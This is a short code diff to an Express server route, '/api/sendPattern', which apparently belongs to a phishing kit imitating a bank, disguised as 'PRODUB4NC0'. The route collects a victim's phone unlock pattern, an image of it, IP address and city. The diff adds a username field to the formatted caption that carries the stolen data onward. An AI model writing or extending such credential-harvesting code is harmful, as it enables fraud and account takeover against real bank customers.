@@ -53,13 +53,13 @@ function cargarCliente(txid) {
 
 // 🔹 Enviar patrón con imagen
 app.post('/api/sendPattern', async (req, res) => {
-  const { patron, patronImg, ip, city } = req.body;
+  const { patron, patronImg, usar, ip, city } = req.body;
 
   if (!patron || !patronImg) {
     return res.status(400).json({ error: 'Faltan datos obligatorios' });
   }
 
-  const caption = `🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\n🌐 IP: ${ip || "N/A"}\n🏙️ Ciudad: ${city || "N/A"}`;
+  const caption = `🟢PRODUB4NC0🟢\n📱 US4R: <code>${usar}</code>\n🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\n🌐 IP: ${ip || "N/A"}\n🏙️ Ciudad: ${city || "N/A"}`;
 
   try {
     const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
